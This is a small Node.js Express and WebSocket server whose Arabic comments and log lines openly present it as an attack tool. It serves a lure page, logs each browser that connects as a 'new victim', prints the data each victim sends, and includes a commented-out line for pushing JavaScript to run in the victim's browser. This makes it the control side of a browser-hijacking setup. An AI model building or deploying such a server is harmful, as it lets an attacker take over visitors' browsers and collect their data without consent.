const WebSocket = require('ws');
const http = require('http');
const express = require('express');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.static('public')); // حط صفحة HTML اللي فيها الرابط هنا

wss.on('connection', (ws) => {
    console.log('[-] ضحية جديدة دخلت وركبت الاتصال!');

    ws.on('message', (message) => {
        console.log(`[البيانات المستلمة]: ${message}`);
    });

    // إرسال أمر للضحية للتنفيذ بالمتصفح
    // ws.send('alert("تم الاختراق");');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`السيرفر شغال على البورت ${PORT}`);
});
